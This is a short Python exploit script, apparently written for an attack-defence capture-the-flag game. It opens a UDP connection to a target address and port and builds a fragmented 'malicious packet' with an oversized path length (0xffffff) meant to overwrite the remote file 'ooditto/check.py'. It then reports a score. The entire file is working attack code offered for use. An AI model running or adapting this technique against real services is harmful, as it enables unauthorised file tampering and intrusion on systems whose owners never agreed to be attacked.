#!/usr/bin/python

from base_exploit import *
from reporter import *
from netfw import *
import sys

class files2(base_exploit):
    id = EXPLOIT_ID_FILES2

    def exploit(self, ip, port):
        # Create a connection to requested destination
        s = socket(AF_INET, SOCK_DGRAM)
        s.connect((ip, port))

        # Path to override
        path = "ooditto/check.py"

        # Create the malicious packet
        pkt = ProtocolHandleUpper(path)
        pkt.path_size = 0xffffff

        # print pkt.serialize()

        # Fragment the packets and send
        FragmentedPacket(pkt).send(s)


if __name__ == "__main__":
    if (len(sys.argv) != 3):
        print "RemoteFiles exploit"
        print "Usage: %s <ip> <Wrapper RECV port>" % (sys.argv[0])
        exit(0)
    TEAM_CONFIG = {"name": "debug",
                   "Robot_ip": sys.argv[1],
                   "server_robot_port": int(sys.argv[2])}

    exp = files2(TEAM_CONFIG)
    reporter = reporter_init()
    score = exp.run()

    reported = reporter_wait(reporter)

    print "Reported: %s" % (reported[0])
    print "exploit returned score %s" % score
